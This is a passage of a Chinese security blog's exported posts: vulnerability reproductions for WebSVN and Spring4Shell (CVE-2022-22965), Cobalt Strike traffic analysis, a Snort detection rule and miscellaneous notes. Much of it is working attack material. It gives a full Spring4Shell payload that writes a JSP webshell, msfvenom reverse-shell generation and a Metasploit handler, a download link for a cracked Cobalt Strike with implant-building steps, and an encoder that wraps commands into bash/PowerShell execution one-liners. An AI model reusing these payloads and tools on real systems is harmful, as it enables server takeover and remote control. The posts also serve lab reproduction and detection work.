(CVE-2021-32305)","slug":"复现WebSVN-2-6-0-操作系统命令注入漏洞-CVE-2021-32305","date":"2022-10-31T14:18:36.000Z","updated":"2024-11-12T07:00:17.000Z","comments":true,"path":"2022/10/31/复现WebSVN-2-6-0-操作系统命令注入漏洞-CVE-2021-32305/","permalink":"https://gryffinbit.top/2022/10/31/%E5%A4%8D%E7%8E%B0WebSVN-2-6-0-%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CVE-2021-32305/","excerpt":"","text":"漏洞描述漏洞详情 WebSVN是一个基于Web的Subversion Repository浏览器，可以查看文件或文件夹的日志，查看文件的变化列表等。其search.php?search= 参数下过滤不严谨导致RCE。 WebSVN官网地址：https://websvnphp.github.io/ 漏洞源码：https://github.com/websvnphp/websvn/releases/tag/2.6.0 漏洞影响WebSVN 2.6.1之前 漏洞分析ubuntu上安装apache 123456789apt-get updateapt-get install nginx# 防火墙未开启# 启动web服务器，查看状态，是否开启systemctl status nginx# 浏览器访问 要停止Web服务器，输入： 1sudo systemctl stop nginx 要在停止时，启动Web服务器，键入： 1sudo systemctl start nginx 要停止，然后再次启动该服务，键入： 1sudo systemctl restart nginx 如果我们只是修改配置，Nginx 可以在不终端的情况下热加载。我们可以键入： 1sudo systemctl reload nginx 默认情况下，Nginx 会在服务器启动时，跟随系统启动，如果我们不想这样，我们可以用这个命令来禁止： 1sudo systemctl disable nginx 要重新让系统启动时引导 Nginx 启动，那么我们可以输入： 1sudo systemctl enable nginx 访问nginx页面 apache与nginx是共用同一个站点目录的，即在apache和nginx中部署的网页文件都放在同一个目录下—&#x2F;var&#x2F;www&#x2F;html.因此访问nginx的端口时本应该调用第三个文件作为欢迎页，却调用了apache的欢迎页文件. 修改nginx端口；w 1234vim /etc/nginx/sites-available/default# 第一行白字部分可修改nginx的端口号# 第二行白字用来设置nginx自己的站点目录# 第三行白字是根据所排列的顺序调用站点目录里的网页文件作为自己的欢迎页(解决一开始的问题只需把index.nginx-debian.html放在index.html前就行了) 漏洞验证环境安装 下载2.6.0的websvn到服务器 123cd /usr/share/nginx/htmlwget https://github.com/websvnphp/websvn/archive/refs/tags/2.6.0.zipunzip 2.6.0.zip 123cd websvn-2.6.0cp include/distconfig.php include/config.phpvim include/config.php 12$config-&gt;addRepository(&#x27;FirServer&#x27;, &#x27;http://81.70.247.200/FirServer&#x27;, null, &#x27;root&#x27;, &#x27;root123&#x27;);$config-&gt;addRepositorySubpath(&#x27;FirServer-Rose&#x27;, &#x27;http://81.70.247.200/FirServer&#x27;, &#x27;branches/branche_rose&#x27;, null, &#x27;root&#x27;, &#x27;root123&#x27;); 参考文章https://shenyu.me/2016/06/12/websvn.html","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://gryffinbit.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[],"author":"Gryffinbit"},{"title":"Spring RCE 特征流量分析（CVE-2022-22965）","slug":"Spring框架远程命令执行漏洞复现（CVE-2022-22965）","date":"2022-10-31T14:18:13.000Z","updated":"2024-11-12T06:59:18.000Z","comments":true,"path":"2022/10/31/Spring框架远程命令执行漏洞复现（CVE-2022-22965）/","permalink":"https://gryffinbit.top/2022/10/31/Spring%E6%A1%86%E6%9E%B6%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2022-22965%EF%BC%89/","excerpt":"","text":"漏洞详情漏洞简介 2022年3月30日，Spring框架曝出RCE 0day漏洞，国家信息安全漏洞共享平台（CNVD）已收录了Spring框架远程命令执行漏洞（CNVD-2022-23942），考虑到Spring框架的广泛应用，漏洞被评级为危险。 通过该漏洞可写入webshell以及命令执行。在Spring框架的JDK9版本(及以上版本)中，远程攻击者可在满足特定条件的基础上，通过框架的参数绑定功能获取AccessLogValve对象并诸如恶意字段值，从而触发pipeline机制并写入任意路径下的文件。 漏洞利用条件 Apache Tomcat作为Servlet容器； 使用JDK9及以上版本的Spring MVC框架； Spring框架以及衍生的框架spring-beans-*.jar文件或者存在 漏洞影响范围 1、JDK JDK 9+ 2、Spring Framework 5.3.18+ 5.2.20+ docker中已经配置好jdk环境了。docker中的环境与宿主机jdk环境无关。只是当时做实验的时候，刚好也装了jdk9，记录了一下安装过程。 ubuntu下jdk9安装： 官网下载jdk，放入解压到路径/usr/lib/jvm 利用update-alternatives 进行jdk版本切换 数字越大，优先级越高 执行命令： 1234567sudo update-alternatives --install /usr/bin/java java /usr/lib/jvm/jdk-9.0.4/bin/java 1000sudo update-alternatives --install /usr/bin/javac javac /usr/lib/jvm/jdk-9.0.4/bin/javac 1000sudo update-alternatives --install /usr/bin/jar jar /usr/lib/jvm/jdk-9.0.4/bin/jar 1000sudo update-alternatives --install /usr/bin/javah javah /usr/lib/jvm/jdk-9.0.4/bin/javah 1000sudo update-alternatives --install /usr/bin/javap javap /usr/lib/jvm/jdk-9.0.4/bin/javap 1000sudo update-alternatives --install /usr/bin/jshell jshell /usr/lib/jvm/jdk-9.0.4/bin/jshell 1000sudo update-alternatives --install /usr/bin/jconsole jconsole /usr/lib/jvm/jdk-9.0.4/bin/jconsole 1000 修改配置 1vim /etc/profile 12345678910#env#export JAVA_HOME=/usr/lib/jvm/jdk-9.0.4#export JRE_HOME=/usr/lib/jvm/jdk-9.0.4/jre#export CLASSPATH=.:$JAVA_HOME/lib:$JAVA_HOME/jre/lib:$CLASSPATH#export PATH=$JAVA_HOME/bin:$JAVA_HOME/jre/bin:$PATH#export JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64#export JRE_HOME=/usr/lib/jvm/java-8-openjdk-amd64/jre#export PATH=$JAVA_HOME/bin:$JAVA_HOME/jre/bin:$PATH#export CLASSPATH=$CLASSPATH:.:$JAVA_HOME/lib:$JAVA_HOME/jre/lib 1source /etc/profile 检查一下 1update-alternatives --display javac 每一个命令都是auto 模式，这样才会自动选择优先级高的。为了确保，可以不用管现在的状态，直接设置一遍这些命令为auto模式。 123456sudo update-alternatives --auto javasudo update-alternatives --auto javacsudo update-alternatives --auto javapsudo update-alternatives --auto javahsudo update-alternatives --auto jconsolesudo update-alternatives --auto jshell 版本检查 12/usr/bin/java -versionjava -version 环境配置主机系统：Apple M1，macOS Ventura version13.0 虚拟机系统（docker靶场系统）： ubuntu 20.04.2 x86 （腾讯云服务器） 漏洞复现靶场项目：https://github.com/vulhub/vulhub ubuntu安装docker 源：https://lug.ustc.edu.cn/wiki/mirrors/help/docker/ 1234curl -fsSL https://get.docker.com | bash -s docker --registry-mirror=https://docker.mirrors.ustc.edu.cndocker --versionsystemctl start dockersystemctl enable docker # 自启 安装pip 12curl -s https://bootstrap.pypa.io/get-pip.py | python3sudo apt install python3-pip 安装docker-compose 12sudo pip3 install docker-compose docker-compose --version 启动靶场环境 12345678910111213# 下载项目wget https://github.com/vulhub/vulhub/archive/master.zip -O vulhub-master.zipunzip vulhub-master.zipcd vulhub-master# 进入某一个漏洞/环境的目录cd Spring/CVE-2022-22965# 自动化编译环境sudo docker-compose build# 启动整个环境sudo docker-compose up -d 可能遇到的问题：卡在了pulling阶段。 因为docker加速器超时导致pull不下来，改成国内镜像 1sudo vim /etc/docker/deamon.json 添加以下内容： 1234&#123;&quot;registry-mirrors&quot;: [&quot;https://docker.mirrors.ustc.edu.cn/&quot;,&quot;https://hub-mirror.c.163.com&quot;,&quot;https://registry.docker-cn.com&quot;],&quot;insecure-registries&quot;: [&quot;10.0.0.12:5000&quot;]&#125; 重启 123systemctl stop dockersystemctl start docker.servicesystemctl status docker.service 漏洞版本验证 进入docker控制台 1234# 找到环境的iddocker ps# bashdocker exec -it &lt;ID&gt; /bin/bash JDK 12cd /usr/local/tomcat/bin./version.sh 利用链利⽤class对象构造利⽤链，对Tomcat的日志配置进行修改，然后，向⽇志中写⼊shell 123456789101112131415# 构建文件的内容class.module.classLoader.resources.context.parent.pipeline.first.pattern=# 修改tomcat日志文件后缀class.module.classLoader.resources.context.parent.pipeline.first.suffix=# 写入文件所在的网站根目录class.module.classLoader.resources.context.parent.pipeline.first.directory=# 写入文件名称class.module.classLoader.resources.context.parent.pipeline.first.prefix=# 文件日期格式（实际构造为空值即可）class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= 构造payload 123456789class.module.classLoader.resources.context.parent.pipeline.first.pattern=%&#123;test&#125;iclass.module.classLoader.resources.context.parent.pipeline.first.suffix=.jspclass.module.classLoader.resources.context.parent.pipeline.first.directory=/app/tomcat/webapps/ROOT/class.module.classLoader.resources.context.parent.pipeline.first.prefix=testfileclass.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= GET发送 123456789101112GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= HTTP/1.1Host: localhost:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Connection: closesuffix: %&gt;//c1: Runtimec2: &lt;%DNT: 1 服务器上验证，确实已经生成了jsp 访问写入的webshell文件 1http://your-ip:8080/tomcatwar.jsp?pwd=j&amp;cmd=id 清空 需要在利用完成后将class.module.classLoader.resources.context.parent.pipeline.first.pattern清空，否则每次请求都会写入新的恶意代码在JSP Webshell中，导致这个文件变得很大。发送如下数据包将其设置为空： 1234567GET /?class.module.classLoader.resources.context.parent.pipeline.first.pattern= HTTP/1.1Host: localhost:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36Connection: close 总体来说，这个漏洞的利用方法会修改目标服务器配置，导致目标需要重启服务器才能恢复，实际测试中需要格外注意。 反弹shell用msf生成木马 12345# msf5的语法 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=your-公网ip LPORT=7777 -f elf &gt; shell.elf# msf6的语法msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=your-公网ip LPORT=7777 -f elf &gt; shell.elf Lhost是监听机器的ip。因为目标机也是公网中的，所以监听机器也需要是公网IP，这样才能访问到。 msf生成的shell.elf是在本地的，需要自己想办法传到服务器上。 端口随便写，但是要打开对应的防火墙规则。 kali： 1234apt-get install ufwufw statusufw enableufw allow 7777 木马上传 正常情况下，应该是在公网的vps下面生成elf，然后wget下载。但我这次在本地生成的，所以直接scp拷到服务器上去。 宿主机向docker传输文件 12docker cp 本地文件的路径 container_id:&lt;docker容器内的路径&gt;docker cp /home/ubuntu/shell.elf 1e652d6144ae:/usr/local/tomcat/webapps/ROOT/ 赋予木马权限 123chmod 777 /shell.elf# url编码chmod%20777%20%2Fshell.elf 1your-公网ip:8080/tomcatwar.jsp?pwd=j&amp;cmd=chmod%20777%20%2Fshell.elf msf开启监听 在公网服务器上 ubuntu上快速安装msf：https://www.cnblogs.com/tomyyyyy/p/12813299.html 123456msfconsole # 在命令行里面输入命令，进入msf漏洞利用框架；use exploit/multi/handler # 监听木马反弹过来的shellset payload linux/x86/meterpreter_reverse_tcp # 设置payload，不同的木马设置不同的payload，设置payload时，要根据目标系统的系统位数设置相应的payload;set lhost &lt;ip&gt; # vps ipset lport &lt;vps端口&gt; # vps端口exploit # 开始进行监听； 执行木马 12/tomcatwar.jsp?pwd=j&amp;cmd=./shell.elf/tomcatwar.jsp?pwd=j&amp;cmd=.%2Fshell.elf 抓包过滤语句：ip终点选靶机的IP。起点选择攻击机的IP。因为靶场走的8080端口，http协议。所以筛选条件加上http协议。 1ip.dst == &lt;靶机IP&gt; &amp;&amp; http 追随No.1277和1566的http流 特征流量分析pipeline.first.pattern 对get头进行解码： 1/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%&#123;c2&#125;i if(&quot;j&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123; java.io.InputStream in = %&#123;c1&#125;i.getRuntime().exec(request.getParameter(&quot;cmd&quot;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; &#125; %&#123;suffix&#125;i&amp;class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&amp;class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&amp;class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&amp;class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat= pipeline.first.suffix parent.pipeline.first.directory pipeline.first.prefix pipeline.first.fileDateFormat 漏洞规则规则思路👇 1alert tcp any any -&gt; [$HOME_NET,$HTTP_SERVERS] any (msg:&quot;SpringCore RCE&quot;; flow:to_server,established; content:&quot;pipeline.first.pattern=&quot;; http_uri; fast_pattern; classtype:attempted; sid:100000; rev:2;) snort规则验证snort的各种配置以及环境，见以前的blog：https://gryffinbit.top/categories/%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B/snort/ 把刚刚抓到的数据包放进snort环境中 把写好的规则文件也放进环境中。 规则配置 把规则文件放进规则路径，并修改snort.conf配置 1234mv CVE-2022-22965.rules /etc/snort/rulescd /etc/snort/ruleslsvim /etc/snort/snort.conf 修改snort.conf的内容 设置需要保护的ip地址 12# Setup the network addresses you are protectingipvar HOME_NET server_public_ip/24 12# Set up the external network addresses. Leave as &quot;any&quot; in most situationsipvar EXTERNAL_NET !$HOME_NET 1234# Path to your rules files (this can be a relative path)var RULE_PATH /etc/snort/rulesvar SO_RULE_PATH /etc/snort/so_rulesvar PREPROC_RULE_PATH /etc/snort/preproc_rules 123# Set the absolute path appropriatelyvar WHITE_LIST_PATH /etc/snort/rulesvar BLACK_LIST_PATH /etc/snort/rules 在setp6里，设置输出 123# unified2# Recommended for most installsoutput unified2: filename snort.log, limit 128 翻到最下面，找到规则集列表。打开local.rules的注释，以允许snort装载个性化规则集。 1include $RULE_PATH/CVE-2022-22965.rules 保存编辑:wq 测试是否能正常工作 1sudo snort -T -c /etc/snort/snort.conf 运行成功 规则验证 tips： Wireshark抓的包可能校验和不对，校验和不对的流量，snort不会检测。 可以通过scapy进行校验和修改 1234567891011121314151617from scapy.all import *from scapy.layers.inet import in4_chksum, IP, TCPpackets = rdpcap(&#x27;/Users/gryffinbit/Desktop/test3.pcap&#x27;)pkts = []for pkt in packets: print(&quot;------------&quot;) if pkt[&quot;TCP&quot;]: print(&quot;old chksum: 0x&#123;:x&#125;&quot;.format(pkt[&#x27;TCP&#x27;].chksum)) pkt[&#x27;TCP&#x27;].chksum = 0 tcp_raw = raw(pkt[TCP]) nchksum = in4_chksum(socket.IPPROTO_TCP, pkt[IP], tcp_raw) print(&quot;new chksum: 0x&#123;:x&#125;&quot;.format(nchksum)) pkt[&#x27;TCP&#x27;].chksum = nchksum pkts.append(pkt)wrpcap(&quot;out.pcap&quot;, pkts) snort接受pcap的格式，所以还需要将包保存为pcap的格式 1snort -c /etc/snort/snort.conf -r Spring【CVE-2022-22965】.pcap -l /var/log/snort/ 检验成功 附录：snort 文件部署路径snort安装包所在路径、相关文档 1/home/parallels/snortFile doc：snort的一些说明文档所在文件夹 snort规则文件、配置文件 1cd /etc/snort snort日志文件 1cd /var/log/snort snort运行 1/usr/local/bin/snort 规则路径 1/etc/snort/rules 配置路径 1/etc/snort/snort.conf 参考文章https://www.freebuf.com/vuls/345007.html https://www.freebuf.com/vuls/326878.html https://blog.csdn.net/weixin_45632448/article/details/124043082","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://gryffinbit.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[],"author":"Gryffinbit"},{"title":"CS批量伪造上线","slug":"CS伪造上线","date":"2022-10-26T15:37:32.000Z","updated":"2024-08-27T02:28:08.000Z","comments":true,"path":"2022/10/26/CS伪造上线/","permalink":"https://gryffinbit.top/2022/10/26/CS%E4%BC%AA%E9%80%A0%E4%B8%8A%E7%BA%BF/","excerpt":"","text":"原理分析监听器管理（Beacon） 监听器：等待被入侵系统连接自己的一个服务。 监听器的作用：为了接受payload回传的各类数据，类似于MSF中handler的作用。比如payload在目标机器执行以后，就会回连到监听器然后下载执行真正的shellcode代码。 一旦监听器建立起来，团队成员只需要知道这个监听器的名称即可，不需要关心监听器背后的基础环境。 stager：就是远程加载Beacon.dll的shellcode Beacon Staging Sever： 是分阶段模式中，提供shellcode等功能扩展存储的Stage服务器。它的作用是为了防止Payload过大或者适应不同的攻击场景，可以分阶段进行payload投递 元数据：描述数据的数据，主要是描述数据属性的信息，用来支持如：指示存储位置、历史数据、资源查找、文件记录等功能。是一种电子式目录。 CS上线流量特征步骤分析 上线包的敏感信息隐藏到了cookie中，特征非常明显。通过进一步分析，可以发现，上线包的请求Cookie值是受控主机元数据经过非对称加密后的密文，CS服务器接收到Cookie值后进行解密，从而获取到受控主机信息 cookie加密过程 攻击者利用CS sever生成新的Beacon监听（包括一对非对称公私钥）并生成stager 攻击者投递Stager到受控主机 受控主机在Exploit阶段执行小巧的Stager 受控主机根据Stager Url请求特征向Beacon Staging Sever 下载体积较大更复杂的Stager到本地，Beacon Staging Server会校验URL的合法性。 Stage解密并解析Beacon配置信息（比如公钥PublicKey、C2 server信息） Stage通过公钥加密主机的元数据并发送至C2 Server C2 Server 用私钥解密数据获取主机元数据 stager url，可以作为特征来识别CS服务器。CS中的Stager URL校验算法，就是生成4位随机校验码，将校验码拼接到URL后面，即可请求到Stage的代码 分阶段上传payload https://blog.csdn.net/qq_44159028/article/details/118157559 stager url校验算法 关键函数：checksum8、MSFURL、isStager 流量特征http-beacon通信中，默认使用get方法向/dpixel、/__utm.gif、/pixel.gif等地址发起请求。 心跳包 https，默认使用空证书建立加密通道。 dns-beacon通信中，默认使用cdn.、www6.、api.、www.、post.为开头发起dns请求，并且查询结果伴随0.0.0.0、0.0.0.80、0.0.0.241等非常规ip。 运行staging模式的pe文件，会向指定服务器的checksum8路径发起请求来下载stage 参考文章 参考文章https://forum.butian.net/share/708 https://www.freebuf.com/articles/network/286276.html https://paper.seebug.org/1922/ https://www.freebuf.com/articles/network/286276.html","categories":[{"name":"漏洞复现","slug":"漏洞复现","permalink":"https://gryffinbit.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[],"author":"Gryffinbit"},{"title":"cobalt strike 4.7安装以及使用","slug":"cobalt-strike-4-7安装以及使用","date":"2022-10-25T17:28:07.000Z","updated":"2024-11-12T06:59:46.000Z","comments":true,"path":"2022/10/26/cobalt-strike-4-7安装以及使用/","permalink":"https://gryffinbit.top/2022/10/26/cobalt-strike-4-7%E5%AE%89%E8%A3%85%E4%BB%A5%E5%8F%8A%E4%BD%BF%E7%94%A8/","excerpt":"","text":"环境安装破解包：[cobalt_strike_4.7](链接: https://pan.baidu.com/s/1c2wxXLiyjz1jvbhCOKHskw?pwd=18kq 提取码: 18kq–来自百度网盘超级会员v6的分享) （客户端、服务器端，都用这个） 客户端： kali Linux 2021.3 服务端：腾讯云 ubuntu 服务器端 进入cs的目录 1234cd cobalt_strike_4.7chmod +x teamserver chmod +x TeamServerImage./teamserver 本机ip 密码 服务器端防火墙设置。（自己选定一个端口，作为连接的端口） 默认端口是50050，使用默认端口的话，记得开启50050 12345# 安装firewallsudo apt-get install firewalldsudo systemctl start firewalldsudo systemctl enable firewalldsudo systemctl status firewalld 1234567891011121314151617181920# 开放端口firewall-cmd --zone=public --add-port=端口号/tcp --permanent# 关闭端口firewall-cmd --zone=public --remove-port=端口号/tcp --permanent# 配置生效firewall-cmd --reload # 查看所有开放的端口firewall-cmd --zone=public --list-ports# 关闭防火墙systemctl stop firewalld.service# 查看防火墙状态firewall-cmd --state# 查看监听的端口netstat -lnpt# 检查端口被哪个进程占用netstat -lnpt |grep 端口号# 查看进程的详细信息ps 端口号# 中止进程kill -9 端口号 客户端 进入 Cobalt Strike 目录，执行 ./start.sh 连接成功 受害机上线(Linux) cobalt- strike4.4版本实验对象为Linux&#x2F;macOS系统，需要下载插件。 GitHub项目：https://github.com/gloxec/CrossC2 插件安装CS客户端：下载Release v3.1.0 版本。下载genCrossC2 和CrossC2Kit就行了 将这些文件都放进新建文件夹CrossC2中，再把CrossC2文件夹放进cobalt_strike_4.4文件夹中 1CrossC2Kit.zip 后渗透linux的插件 正常加载CS客户端，进入客户端后选择加载脚本，选择CrossC2Kit里面的CrossC2Kit_Loader.cna加载 复制服务端上cobaltstrike4.4目录下的 .cobaltstrike.beacon_keys到本地目录下。 客户端 ，将.cobaltstrike.beacon_keys放进CrossC2文件夹 生成木马要新建一个监听器，要https的。 需要手动生成木马，CS客户端生成的不好用。 1234chmod +x genCrossC2.Linux ./genCrossC2.Linux ip 52000 .cobaltstrike.beacon_keys null Linux x64 lovetutu.elf# 就是./genCrossC2.Linux 监听器的ip 监听器的端口 cs服务器上的那个文件的路径 null Linux x64 木马的路径和名字 然后就会生成可以用的木马啦~ 在受害机器上运行木马，就上线了 ​","categories":[{"name":"Web安全","slug":"Web安全","permalink":"https://gryffinbit.top/categories/Web%E5%AE%89%E5%85%A8/"}],"tags":[],"author":"Gryffinbit"},{"title":"macos上apptranslocation是什么","slug":"macos上apptranslocation是什么","date":"2022-10-24T16:37:36.000Z","updated":"2024-11-12T06:59:27.000Z","comments":true,"path":"2022/10/25/macos上apptranslocation是什么/","permalink":"https://gryffinbit.top/2022/10/25/macos%E4%B8%8Aapptranslocation%E6%98%AF%E4%BB%80%E4%B9%88/","excerpt":"","text":"系统介绍我的系统是macOS Monterey。 M1.2020 问题介绍今天在运行一个破解文件的时候，解压了该软件的压缩包，然后去打开它的readme.txt. 系统忽然提示，我有磁盘插入。引起了我的警觉。当时在想，是什么？病毒？后门？以前没在Mac上中过病毒，人很蒙。立马断网关机，查查怎么回事。 当时问题的截图 👇 解惑对AppTranslocation下手搜索。 macOS会对文件进行签名验证，以便macOS知道下载后可以信任他。打包在未签名的磁盘映像或.zip存档上的应用程序受到App Translocation的约束，会阻止它的工作。当判断签名有问题时，会将应用放到AppTranlocation下面，进行沙箱隔离。之后每次打开都会走沙箱路径。 后续没继续深究，应该没什么威胁。就没管了 参考文章https://forum.cocos.org/t/cocoscreator3d1-0-3-mac-10-14/88571/2","categories":[{"name":"杂七杂八","slug":"杂七杂八","permalink":"https://gryffinbit.top/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"}],"tags":[],"author":"Gryffinbit"},{"title":"一些杂七杂八提醒自己的东西","slug":"一些杂七杂八提醒自己的东西","date":"2022-10-20T18:11:15.000Z","updated":"2024-08-27T02:28:09.000Z","comments":true,"path":"2022/10/21/一些杂七杂八提醒自己的东西/","permalink":"https://gryffinbit.top/2022/10/21/%E4%B8%80%E4%BA%9B%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB%E6%8F%90%E9%86%92%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%9C%E8%A5%BF/","excerpt":"","text":"反弹shell@java.lang.Runtime@getRuntime().exec(‘id’) base64编码工具 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152&lt;!DOCTYPE html&gt;&lt;html&gt; &lt;head&gt; &lt;title&gt;java runtime exec usage...&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;p&gt;Input type: &lt;input type=&quot;radio&quot; id=&quot;bash&quot; name=&quot;option&quot; value=&quot;bash&quot; onclick=&quot;processInput();&quot; checked=&quot;&quot;&gt;&lt;label for=&quot;bash&quot;&gt;Bash&lt;/label&gt; &lt;input type=&quot;radio&quot; id=&quot;powershell&quot; name=&quot;option&quot; value=&quot;powershell&quot; onclick=&quot;processInput();&quot;&gt;&lt;label for=&quot;powershell&quot;&gt;PowerShell&lt;/label&gt; &lt;input type=&quot;radio&quot; id=&quot;python&quot; name=&quot;option&quot; value=&quot;python&quot; onclick=&quot;processInput();&quot;&gt;&lt;label for=&quot;python&quot;&gt;Python&lt;/label&gt; &lt;input type=&quot;radio&quot; id=&quot;perl&quot; name=&quot;option&quot; value=&quot;perl&quot; onclick=&quot;processInput();&quot;&gt;&lt;label for=&quot;perl&quot;&gt;Perl&lt;/label&gt;&lt;/p&gt; &lt;p&gt;&lt;textarea rows=&quot;10&quot; style=&quot;width: 100%; box-sizing: border-box;&quot; id=&quot;input&quot; placeholder=&quot;Type Bash here...&quot;&gt;&lt;/textarea&gt; &lt;textarea rows=&quot;5&quot; style=&quot;width: 100%; box-sizing: border-box;&quot; id=&quot;output&quot; onclick=&quot;this.focus(); this.select();&quot; readonly=&quot;&quot;&gt;&lt;/textarea&gt;&lt;/p&gt; &lt;script&gt; var taInput = document.querySelector(&#x27;textarea#input&#x27;); var taOutput = document.querySelector(&#x27;textarea#output&#x27;); function processInput() &#123; var option = document.querySelector(&#x27;input[name=&quot;option&quot;]:checked&#x27;).value; switch (option) &#123; case &#x27;bash&#x27;: taInput.placeholder = &#x27;Type Bash here...&#x27; taOutput.value = &#x27;bash -c &#123;echo,&#x27; + btoa(taInput.value) + &#x27;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;; break; case &#x27;powershell&#x27;: taInput.placeholder = &#x27;Type PowerShell here...&#x27; poshInput = &#x27;&#x27; for (var i = 0; i &lt; taInput.value.length; i++) &#123; poshInput += taInput.value[i] + unescape(&quot;%00&quot;); &#125; taOutput.value = &#x27;powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc &#x27; + btoa(poshInput); break; case &#x27;python&#x27;: taInput.placeholder = &#x27;Type Python here...&#x27; taOutput.value = &quot;python -c exec(&#x27;&quot; + btoa(taInput.value) + &quot;&#x27;.decode(&#x27;base64&#x27;))&quot;; break; case &#x27;perl&#x27;: taInput.placeholder = &#x27;Type Perl here...&#x27; taOutput.value = &quot;perl -MMIME::Base64 -e eval(decode_base64(&#x27;&quot; + btoa(taInput.value) + &quot;&#x27;))&quot;; break; default: taOutput.value = &#x27;&#x27; &#125; if (!taInput.value) taOutput.value = &#x27;&#x27;; &#125; taInput.addEventListener(&#x27;input&#x27;, processInput, false); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; Shell、命令等，上传到java的时候，base64编码一下 web攻击一些注入攻击，bp该包等攻击，注意url编码一下 代码审计的时候，可以用codeQL，用来查找漏洞函数 代码审计的时候，因为代码太多了，函数也太多了，就可以用codeQL来找一些符合条件的函数。 应用场景：你需要找一个函数，他传入的参数是String类型，而且返回的值也是String类型，还有就是函数名字是setXxx这样的 cs rce CVE-2022-39197 漏洞复现 CS_XSS.ql 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768/** * @kind path-problem */import java//查找source的类到恶意类的通路//source有xxx属性、有setXXX方法且有一个String参数、instanceof Componentclass XXXSetMethod extends Method&#123; XXXSetMethod()&#123; this.getName().indexOf(&quot;set&quot;) = 0 and this.getName().length() &gt; 3 and this.getNumberOfParameters() = 1 and this.getAParamType().hasName(&quot;String&quot;) and this.getDeclaringType().getASupertype*().hasQualifiedName(&quot;java.awt&quot;, &quot;Component&quot;) &#125;&#125;class JNDIMethod extends Method&#123; JNDIMethod()&#123; this.getDeclaringType().getAnAncestor().hasQualifiedName(&quot;javax.naming&quot;, &quot;Context&quot;) and this.hasName(&quot;lookup&quot;) &#125;&#125;class InvokeMethod extends Method &#123; InvokeMethod() &#123; this.hasName(&quot;invoke&quot;) &#125;&#125;class NewInstanceMethod extends Method &#123; NewInstanceMethod() &#123; exists(RefType type, Method m| this.getACallee() = m and m.hasName(&quot;newInstance&quot;) and m.getDeclaringType*().getErasure() = type ) &#125;&#125;class CommandInjectMethod extends Method &#123; CommandInjectMethod() &#123; this.getACallee() instanceof ExecCallable &#125;&#125;class RuntimeMethod extends Method &#123; RuntimeMethod() &#123; this.getDeclaringType().hasQualifiedName(&quot;java.lang&quot;, &quot;Runtime&quot;) and this.hasName(&quot;exec&quot;) &#125;&#125;class TargetMethod extends Method &#123; TargetMethod() &#123; this instanceof JNDIMethod or // this instanceof InvokeMethod or // this instanceof NewInstanceMethod or this instanceof CommandInjectMethod or this instanceof MethodRuntimeExec or this instanceof MethodProcessBuilderCommand &#125;&#125;query predicate edges(Method a, Method b) &#123; a.polyCalls(b) &#125;from XXXSetMethod entryPoint, TargetMethod endwhere edges*(entryPoint, end)select entryPoint, entryPoint, end, &quot;Found a path from start to target.&quot;","categories":[{"name":"杂七杂八","slug":"杂七杂八","permalink":"https://gryffinbit.top/categories/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/"}],"tags":[],"author":"Gryffinbit"},{"title":"struts2漏洞复现（S2-016 S2-008 S2-057 